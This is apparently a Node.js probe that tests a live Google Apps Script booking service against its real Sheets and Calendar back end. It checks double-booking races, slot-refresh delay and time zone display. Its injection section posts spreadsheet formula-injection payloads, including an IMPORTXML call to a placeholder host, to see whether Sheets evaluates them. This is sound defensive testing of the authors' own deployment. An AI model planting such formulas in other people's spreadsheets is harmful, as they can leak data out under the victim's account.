/* ============================================================
   CE QUE LE VRAI SERVICE FAIT VRAIMENT
   `node tools/prod-sonde.mjs [cas]`
   cas : etat · injection · double · fuseau · tout

   POURQUOI IL EXISTE. Le banc execute le vrai `Code.gs`, mais avec
   des services Google en memoire. Il ne peut rien dire de ce que
   Sheets fait d'un « = », de ce que le service avance Calendar rend
   comme forme, ni du temps que Google met a repondre. Ces
   trois-la ne se prouvent que contre le vrai deploiement.

   IL ECRIT DANS LE VRAI CLASSEUR. Chaque ligne posee porte
   « ZZTEST », qui est dans `MARQUEURS_ESSAI` : `nettoyerAutotest()`
   sait les retrouver et les retirer.

   L'adresse vient de `.env.local` et n'est jamais imprimee.
   ============================================================ */
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ICI = path.dirname(fileURLToPath(import.meta.url));
const RACINE = path.resolve(ICI, "..");
const CAS = process.argv[2] || "tout";

const env = fs.readFileSync(path.join(RACINE, ".env.local"), "utf8");
const m = /^APED_WEB_APP_URL=(.+)$/m.exec(env);
if (!m) { console.error("APED_WEB_APP_URL absent de .env.local"); process.exit(1); }
const SERVICE = m[1].trim();

let echecs = 0, cas = 0;
function verifier(nom, obtenu, attendu, note) {
  cas++;
  const ok = String(obtenu) === String(attendu);
  if (!ok) echecs++;
  console.log("  " + (ok ? "OK   " : "ECHEC") + " " + nom
    + "\n         obtenu  : " + obtenu
    + "\n         attendu : " + attendu
    + (note ? "\n         " + note : ""));
}
function titre(t) { console.log(""); console.log("--- " + t); }

async function poster(charge) {
  const t0 = Date.now();
  const res = await fetch(SERVICE, {
    method: "POST",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(charge),
    redirect: "follow"
  });
  const txt = await res.text();
  let j = null;
  try { j = JSON.parse(txt); } catch (e) { j = { _brut: txt.slice(0, 120), _statut: res.status }; }
  j._ms = Date.now() - t0;
  return j;
}
async function creneaux() {
  const t0 = Date.now();
  const r = await fetch(SERVICE + "?action=creneaux", { redirect: "follow" });
  const j = await r.json();
  j._ms = Date.now() - t0;
  return j;
}

/* ============================================================
   ETAT — ce qui est deja la
   ============================================================ */
if (CAS === "etat" || CAS === "tout") {
  titre("L'ETAT DU SERVICE ET DE L'AGENDA");
  const vie = await (await fetch(SERVICE, { redirect: "follow" })).json();
  console.log("  version deployee : " + vie.version
    + " · service avance : " + vie.calendrier
    + " · porte diag : " + (vie.diag === true));
  console.log("  agendas lus : " + JSON.stringify(vie.calendriers || "(pas rendu par cette version)"));

  const c = await creneaux();
  console.log("  porte des creneaux : " + c._ms + " ms · " + c.total + " plages sur " + c.jours.length + " jours");
  const parJour = {};
  c.jours.forEach((j) => { parJour[j.date] = j.creneaux.length; });
  const plein = Math.max(...Object.values(parJour));
  console.log("  plages par jour plein : " + plein);
  const troues = Object.entries(parJour).filter(([, n]) => n < plein && n > 0);
  console.log("  jours incomplets : " + (troues.map(([d, n]) => d + "=" + n).join(" ") || "aucun"));
  const j7 = c.jours.find((x) => x.date === "2026-08-07");
  if (j7) console.log("  2026-08-07 : " + j7.creneaux.map((x) => x.h).join(" · "));
}

/* ============================================================
   INJECTION — ce que Sheets fait d'un « = »
   ============================================================ */
if (CAS === "injection" || CAS === "tout") {
  titre("L'INJECTION DE FORMULE, CONTRE LE VRAI SHEETS");
  /* Trois charges, trois familles. La troisieme est celle qui
     compte : `IMPORTXML` fait sortir une requete du classeur, sous
     le compte de l'agence, a chaque ouverture. */
  const charges = [
    ["=1+1", "le cas d'ecole"],
    ["+41855501@42", "le « + » et le « @ », que Sheets lit aussi"],
    ['=IMPORTXML("https://exemple.ca/x","//a")', "celle qui sort du classeur"]
  ];
  for (const [texte, quoi] of charges) {
    const r = await poster({
      _form: "contact",
      nom: "ZZTEST Injection",
      email: "zztest@exemple.ca",
      telephone: "418 555 0143",
      message: texte,
      _subject: "ZZTEST injection"
    });
    verifier("la demande passe — " + quoi, r.success, true,
      "« " + texte + " » · ligne " + (r.ligne || "?") + " · " + r._ms + " ms");
  }
  console.log("");
  console.log("  LE VERDICT NE SE LIT PAS ICI. Il se lit dans le classeur,");
  console.log("  par `?action=diag` : une cellule dont `formule` n'est pas");
  console.log("  vide a ete prise pour un calcul. Cette porte n'existe qu'a");
  console.log("  partir de la version 3 — relancez apres le redeploiement.");
}

/* ============================================================
   DOUBLE RESERVATION — deux personnes, la meme plage
   ============================================================ */
if (CAS === "double" || CAS === "tout") {
  titre("DEUX RESERVATIONS QUASI SIMULTANEES SUR LA MEME PLAGE");
  const c = await creneaux();
  /* On vise une plage LOIN dans le temps : elle a peu de chances
     d'etre prise par autre chose pendant l'essai. */
  const j = c.jours[c.jours.length - 2];
  const plage = j.creneaux[j.creneaux.length - 1];
  console.log("  plage visee : " + j.libelle + " a " + plage.h);

  const base = {
    _form: "booking", telephone: "418 555 0144",
    mode: "Appel téléphonique", plage_iso: plage.iso,
    sujet: "ZZTEST double reservation", _subject: "ZZTEST double"
  };
  /* DEUX DEMANDEURS DIFFERENTS : meme plage, signatures distinctes.
     Deux fois la MEME personne serait dedoublonne, ce qui est le
     bon comportement mais pas celui qu'on teste ici. */
  const [a, b] = await Promise.all([
    poster(Object.assign({}, base, { nom: "ZZTEST Alpha", email: "zztest@exemple.ca" })),
    poster(Object.assign({}, base, { nom: "ZZTEST Beta", email: "zztest2@exemple.ca" }))
  ]);

  console.log("  A : " + JSON.stringify(a).slice(0, 150));
  console.log("  B : " + JSON.stringify(b).slice(0, 150));
  const passes = [a, b].filter((x) => x.success === true).length;
  verifier("une seule passe", passes, 1);
  const refuse = [a, b].find((x) => x.success === false);
  verifier("l'autre recoit un refus explicite",
    refuse ? /vient d’être prise|vient d'être prise/.test(refuse.message) : "aucun refus", true,
    refuse ? "« " + refuse.message + " »" : "");

  const apres = await creneaux();
  const jApres = apres.jours.find((x) => x.date === j.date);
  verifier("la plage a disparu de l'affichage",
    (jApres ? jApres.creneaux.some((x) => x.iso === plage.iso) : false), false,
    "il restait " + j.creneaux.length + " plages, il en reste "
    + (jApres ? jApres.creneaux.length : 0));
}

/* ============================================================
   DELAI — « tu bloques, ca disparait en combien de temps ? »
   ============================================================ */
if (CAS === "delai" || CAS === "tout") {
  titre("COMBIEN DE TEMPS AVANT QU'UNE PLAGE PRISE DISPARAISSE");

  const c0 = await creneaux();
  const j = c0.jours[c0.jours.length - 3];
  const plage = j.creneaux[j.creneaux.length - 1];
  console.log("  on prend : " + j.libelle + " a " + plage.h);

  const t0 = Date.now();
  const r = await poster({
    _form: "booking", nom: "ZZTEST Delai", email: "zztest3@exemple.ca",
    telephone: "418 555 0145", mode: "Appel téléphonique",
    plage_iso: plage.iso, sujet: "ZZTEST mesure du delai", _subject: "ZZTEST delai"
  });
  const msEcriture = Date.now() - t0;
  verifier("la reservation passe", r.success, true, msEcriture + " ms pour ecrire");
  if (!r.success) { console.log("  " + r.message); }

  /* ON INTERROGE JUSQU'A CE QUE CA CHANGE, on ne dort pas un
     nombre de secondes choisi d'avance. Le premier appel part
     immediatement : s'il voit deja la plage partie, la reponse est
     « tout de suite », et c'est un vrai resultat. */
  let disparue = false, tours = 0, msDisparition = null;
  const debut = Date.now();
  while (!disparue && Date.now() - debut < 120000) {
    tours++;
    const c = await creneaux();
    const jj = c.jours.find((x) => x.date === j.date);
    disparue = !jj || !jj.creneaux.some((x) => x.iso === plage.iso);
    if (disparue) msDisparition = Date.now() - debut;
    else await new Promise((s) => setTimeout(s, 1500));
  }
  verifier("la plage finit par disparaitre de la porte", disparue, true,
    disparue ? ("apres " + msDisparition + " ms, au " + tours + "e appel")
             : "toujours la apres 120 s");
  if (disparue) {
    console.log("");
    console.log("  >>> ON BLOQUE, CA DISPARAIT EN " + Math.round(msDisparition / 1000) + " s");
    console.log("      (" + tours + " appel(s) de " + Math.round(msDisparition / tours) + " ms en moyenne)");
    console.log("      Aucun cache cote serveur : `creneauxLibres()` relit");
    console.log("      l'agenda a chaque appel. Le seul delai est celui de");
    console.log("      Google entre l'ecriture et la relecture.");
    console.log("      Cote site, un antememoire de 45 s existe et se purge");
    console.log("      des qu'une reservation est refusee (`rafraichirCreneaux(true)`).");
  }
}

/* ============================================================
   FUSEAU — la meme heure partout
   ============================================================ */
if (CAS === "fuseau" || CAS === "tout") {
  titre("L'HEURE, DES DEUX COTES QU'ON PEUT VOIR D'ICI");
  const c = await creneaux();
  verifier("le service annonce le fuseau de Quebec", c.fuseau, "America/Toronto");

  /* L'ISO et le libelle doivent designer le MEME instant. Le libelle
     est fabrique par le serveur en heure de Toronto ; on le
     recalcule ici a partir de l'ISO, dans ce fuseau-la, et les deux
     doivent coincider. Un ecart voudrait dire que l'ecran ment. */
  let ecarts = 0, controles = 0;
  const fmt = new Intl.DateTimeFormat("fr-CA", {
    timeZone: "America/Toronto", hour: "numeric", minute: "2-digit", hourCycle: "h23"
  });
  for (const j of c.jours.slice(0, 6)) {
    for (const p of j.creneaux) {
      controles++;
      const attendu = fmt.format(new Date(p.iso)).replace(":", " h ").replace(/^(\d) /, "$1 ");
      const rendu = p.h.replace(/\s+/g, " ").trim();
      const norm = (s) => s.replace(/ /g, " ").replace(/\s+/g, "").replace(/^0/, "");
      if (norm(attendu) !== norm(rendu)) {
        if (ecarts < 3) console.log("    ecart : ISO " + p.iso + " -> « " + rendu + " » vs « " + attendu + " »");
        ecarts++;
      }
    }
  }
  verifier("l'heure affichee correspond a l'instant ISO, a Toronto",
    ecarts, 0, controles + " plages relues");

  /* LE CHANGEMENT D'HEURE. Le 1er novembre 2026, Toronto recule
     d'une heure. Si l'horizon l'atteint, on verifie qu'aucune plage
     ne saute ; sinon on le DIT plutot que de rendre un « ok » qui
     n'a rien controle. */
  const dst = c.jours.find((x) => x.date >= "2026-11-01");
  if (dst) {
    verifier("les plages du 1er novembre tiennent la grille",
      dst.creneaux.length > 0, true, dst.date + " · " + dst.creneaux.length + " plages");
  } else {
    console.log("  le changement d'heure est HORS de l'horizon de "
      + c.horizonJours + " jours — non controle ici.");
    console.log("  `tools/creneaux-check.mjs` le couvre sur six dates nommees.");
  }
}

console.log("");
console.log("============================================================");
console.log(`LA SONDE DE PRODUCTION : ${cas - echecs} / ${cas}`);
console.log("============================================================");
process.exit(echecs ? 1 : 0);
